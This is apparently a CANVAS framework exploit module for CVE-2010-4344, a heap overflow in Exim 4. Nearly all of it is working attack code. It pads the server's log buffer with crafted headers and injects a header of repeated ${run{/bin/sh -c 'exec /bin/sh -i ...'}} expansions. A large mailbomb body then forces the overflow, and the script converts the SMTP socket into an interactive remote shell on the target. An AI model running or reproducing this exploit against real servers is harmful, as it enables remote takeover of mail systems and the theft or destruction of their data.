#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  cve_2010_4344.py
## Description:
##            :
## Created_On :  Wed Jan 20 09:30:32 EST 2010
## Created_By :  Ronald Huizer
## Modified_On:  Thu Mar 11 10:03:03 EST 2010
## Modified_By:  Ronald Huizer
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
##
## vim: sw=4 ts=4 expandtab
###############################################################################

# Tested on Ubuntu-desktop 9.10/exim4-4.69-11ubuntu4

import sys
if '.' not in sys.path:
    sys.path.append('.')

import re

import smtplib
from MOSDEFShellServer import MosdefShellServer
from linuxNode import linuxNode
import unixShellNode
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
from libs.ctelnetlib import Telnet
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'exim'
DOCUMENTATION['Date public'] = '12/07/2010'
DOCUMENTATION['CVE Name'] = 'CVE-2010-4344'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4344'
DOCUMENTATION['Repeatability'] = "Infinite"
DOCUMENTATION['References'] = [
    "http://bugs.exim.org/show_bug.cgi?id=787",
    "http://www.exim.org/lurker/message/20101207.215955.bb32d4f2.en.html"
]

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Remote'
PROPERTY['ARCH'] = [ ['Linux'] ]

DESCRIPTION = 'Exim 4 string_format() heap overflow'
NAME = "CVE-2010-4344"
VERSION = 1

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port = 25

        # Information on the client host.  Will be collected from EHLO.
        self.client_name = ""
        self.client_ip = ""
        self.target_name = ""
        self.mail_from = ""
        self.rcpt_to = ""
        self.ehlo_name = ""
        # SMTP mail size to trigger the event with.
        self.mail_size = 50

    def getArgs(self):
        self.port = self.getarg("port")
        self.ehlo_name = self.getarg("ehlo_name")
        self.mail_from = self.getarg("mail_from")
        self.rcpt_to = self.getarg("rcpt_to")
        self.mail_size = self.getarg("mail_size") * 1024 * 1024

    def fill_log_buffer(self, s, size):
        """Fills the remote log buffer which has size bytes left by
           generating header patterns of at least 20 bytes and at
           most 128 bytes."""
        total = 0
        div = size / 128
        rem = size % 128

        # We need to have at least 20 bytes for the next header entry, if
        # not then we need to borrow from the previous line, and emulate
        # this in the remainder.
        if rem < 20:
                div = div - 1
                rem = rem + 128

        for i in xrange(0, div):
                total = total + s.send(("MAILbombhdr%.4d: %s" % (i, "M4ilB0mb" * 16))[:128 - 3] + "\n")

        if rem > 128:
                total = total + s.send(("MAILbombhdr%.4d: %s" % (div, "M4ilB0mb" * 16))[:rem / 2 + rem % 2 - 3] + "\n")
                total = total + s.send(("MAILbombhdr%.4d: %s" % (div + 1, "M4ilB0mb" * 16))[:rem / 2 - 3] + "\n")
        else:
                total = total + s.send(("MAILbombhdr%.4d: %s" % (div, "M4ilB0mb" * 16))[:rem - 3] + "\n")

        return total

    def get_log_buffer_space(self):
        log_header = 'YYYY-MM-DD HH:MM:SS XXXXXX-XXXXXX-XX rejected from <'
        log_header += self.mail_from + '>'

        self.log('[+] Client name: %s' % self.client_name)
        self.log('[+] Client ip: %s' % self.client_ip)
        
                 
        if re.match("\[.*\]", self.client_name):
            log_header += ' H=(' + self.ehlo_name + ')'
        else:
            log_header += ' H=' + self.client_name
            log_header += ' (' + self.ehlo_name + ')'

        log_header += ' [' + self.client_ip + ']'
        log_header += ': message too big: read='
        log_header += 'X' * (len(str(self.mail_size)))
        log_header += ' max='
        log_header += 'X' * (len(str(self.mail_size)))
        log_header += '\n'
        log_header += "Envelope-from: <%s>\n" % self.mail_from
        log_header += "Envelope-to: <%s>\n" % self.rcpt_to

        return 8192 - len(log_header)

    def mailbomb(self, s):
        progress = 0
        bombline = "MAILbombMAILbombMAILbombMAILbombMAILbombMAILbomb"
        bombline += "MAILbombMAILbombMAILbombMAILbomb\n"
        bombcount = self.mail_size / len(bombline) + 1

        for i in xrange(0, bombcount):
            s.send(bombline)
            if i / (bombcount / 100) != progress:
                progress = i / (bombcount / 100)
                self.setProgress(progress)

    def send_evil_header(self, s):
        header = "HeaderX: "

        for i in xrange(0, 50):
            for j in xrange(3, 15):
                header += "${run{/bin/sh -c 'exec /bin/sh -i <&%d >&0 2>&0'}} " % j

        return s.send(header + "\n")

    def run(self):
        self.getArgs()
        self.host = self.target.interface
        self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))

        try:
            s = smtplib.SMTP(self.host, self.port, timeout=10)
        except:
            self.log("Could not connect to smtp")
            return False

        s.sock.set_timeout(20)

        try:
            if self.ehlo_name == "":
                s.ehlo()
            else:
                s.ehlo(self.ehlo_name)
        except:
            self.log("EHLO failed")
            return False

        # Parse out the client hostname and ip address from the EHLO response
        self.log("EHLO reply: %s" % s.ehlo_resp)
        response = re.split(" |\t|\r\n|\n", s.ehlo_resp)

        self.target_name = response[0]
        self.client_name, self.client_ip = response[2:4]

        if self.ehlo_name == "":
            self.ehlo_name = s.local_hostname

        # Eliminate the encapsulating [] from the target ip address
        self.client_ip = self.client_ip[1:-1]

        self.log("Parsing EHLO response.")
        self.log("Target name = " + self.target_name)
        self.log("Client name = " + self.client_name)
        self.log("Client IP = " + self.client_ip)

        # Send MAIL FROM using client name.
        if self.mail_from == "":
            self.mail_from = "canvas@%s" % self.client_name

        try:
            n, r = s.docmd("MAIL FROM: %s" % self.mail_from)
        except:
            self.log("SMTP server disconnected")
            return False

        if n != 250:
            self.log("MAIL FROM command failed: %d %s" % (n, r))
            return False

        # Send RCPT TO using target name.
        if self.rcpt_to == "":
            self.rcpt_to = "postmaster@%s" % self.target_name
        try:
            n, r = s.docmd("RCPT TO: <%s>" % self.rcpt_to)
        except:
            self.log("SMTP server disconnected")
            return False

        if n != 250:
            self.log("RCPT TO command failed: %d %s" % (n, r))
            return False

        # Send DATA command.
        try:
            n, r = s.docmd("DATA")
        except:
            self.log("SMTP server disconnected")
            return False

        if n != 354:
            self.log("DATA command failed: %d %s" % (n, r))
            return False

        # Proceed to send out the headers
        log_space = self.get_log_buffer_space()
        self.log("Log buffer space: %u" % log_space)

        # Fill the log buffer by sending headers.  We reserve three bytes
        # for the "%c " used for the next header, and the terminating 0
        # reserved in string_format() itself.
        self.log("Filling log buffer with %u bytes" % (log_space - 3))
        try:
            filled = self.fill_log_buffer(s.sock, log_space - 3)
        except:
            self.log("Filling log failed")
            return False
        self.log("Sent %u header bytes to accomplish this" % filled)

        # Send over the attack string
        self.log("Sending attack string")
        try:
            self.send_evil_header(s.sock)
        except:
            self.log("Sending evil header failed")
            return False

        # And finally send 50MiB of crap to go over the message size.
        self.log("Sending larger message than allowed...")
        try:
            self.mailbomb(s.sock)
        except:
            self.log("Sending mailbomb failed")
            return False
        self.log("Done!")

        # Send '.' command to terminate the mail.  We expect this to
        # result in a 552 error.
        try:
            n, r = s.docmd(".")
        except:
            self.log("SMTP server disconnected")
            return False

        if n != 552:
            self.log("Sending message did not trigger 552: %d %s" % (n, r))
            return False

        # Trigger the ACL which string_expands() our evil header.
        self.log("Trying to trigger bug")
        try:
            s.sock.send("MAIL FROM: <harhar@harhar.com>\r\n")
        except:
            self.log("Sending trigger failed")
            return False

        # See what the remote answered.  This should drain either the
        # SMTP return code, or the shell command line.
        self.log("Verifying trigger")
        try:
            s.sock.recv(4096)
        except:
            self.log("Error reading trigger response.  Daemon crashed?")
            return False

        # Verify if things worked.  We send a string with backslashes in
        # there, as the shell will eat them, while an MTA will not.
        try:
            s.sock.send("/bin/echo har\\har\\har\\har\r\n")
        except:
            self.log("Sending of verifier failed")

        # See what the remote answered.
        try:
            response = s.sock.recv(4096)
        except:
            self.log("Error reading trigger response.  Daemon crashed?")
            return False

        # harharharhar is not guaranteed to be seen in the response (for instance ubuntu 9.x with exim 4.6x)
        # (maybe) better way to judge success is to try and execute a command and check reply
        # if response.find("harharharhar") == -1 and response.find("access tty") == -1 and response.find("$") == -1:
        #     self.log("Exploit failed. Did not spawn a shell.")
        #     self.log("Response was: " + response)
        #     return False
        # self.log("Success!  Trigger response: " + response)
        # Success, convert to unixShellNode through shellfromtelnet.
        
        try:
            node = unixShellNode.unixShellNode()
            node.parentnode = self.argsDict["passednodes"][0]
            tnshell = Telnet()
            tnshell.sock = s.sock
            shell = shelllistener(shellfromtelnet(tnshell))

            ret = shell.runcommand('/bin/uname -a')
            if not ret: raise Exception('No reason')
            self.log('Runcommand output: %s' % ret)
        except:
            self.log('Exploit failed. Did not spawn a shell: %s' % response)
            return False

        self.log('Success! Trigger response: ' + response)
        node.shell = shell
        shell.node = node

        self.setInfo("%s attacking %s:%d (succeeded!)" % (NAME, self.host, self.port))
        return node


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)

    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
